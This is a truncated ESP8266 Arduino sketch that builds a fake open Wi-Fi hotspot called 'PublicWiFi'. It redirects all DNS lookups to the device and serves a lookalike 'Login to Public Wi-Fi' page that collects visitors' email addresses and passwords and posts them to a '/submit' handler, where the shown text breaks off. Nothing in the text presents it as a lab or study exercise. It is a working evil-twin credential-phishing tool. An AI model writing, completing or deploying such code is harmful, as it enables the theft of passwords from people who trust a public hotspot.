#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128  // OLED display width
#define SCREEN_HEIGHT 64   // OLED display height
#define OLED_RESET -1      // Reset pin

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
ESP8266WebServer server(80);
DNSServer dnsServer;

const char* ssid = "PublicWiFi";  // Your Wi-Fi SSID
const char* password = "";         // No Wi-Fi password

void setup() {
  // Initialize serial communication
  Serial.begin(115200);
  
  // Initialize OLED display
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Set up the ESP8266 as an Access Point without a password
  WiFi.softAP(ssid, password);
  
  // Start the DNS server
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Print the IP address of the AP
  Serial.println("Access Point started");
  Serial.print("IP address: ");
  Serial.println(WiFi.softAPIP());
  
  // Serve the login page
  server.on("/", HTTP_GET, []() {
    String html = "<html lang='en'>"
                  "<head>"
                  "<meta charset='UTF-8'>"
                  "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                  "<title>Login to Public Wi-Fi</title>"
                  "<style>"
                  "body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; }"
                  "h1 { color: #333; }"
                  "form { background-color: #fff; padding: 20px; border-radius: 5px; display: inline-block; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); }"
                  "input[type='text'], input[type='password'] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }"
                  "input[type='submit'] { background-color: #5cb85c; color: white; border: none; border-radius: 4px; padding: 10px; cursor: pointer; }"
                  "input[type='submit']:hover { background-color: #4cae4c; }"
                  "</style>"
                  "</head>"
                  "<body>"
                  "<h1>Login to Public Wi-Fi</h1>"
                  "<form action='/submit' method='POST'>"
                  "<input type='text' name='email' placeholder='Email' required>"
                  "<input type='password' name='password' placeholder='Password' required>"
                  "<input type='submit' value='Login'>"
                  "</form>"
                  "</body>"
                  "</html>";
    server.send(200, "text/html", html);
  });

  // Handle form submission
  server.on("/submit", HTTP_POST
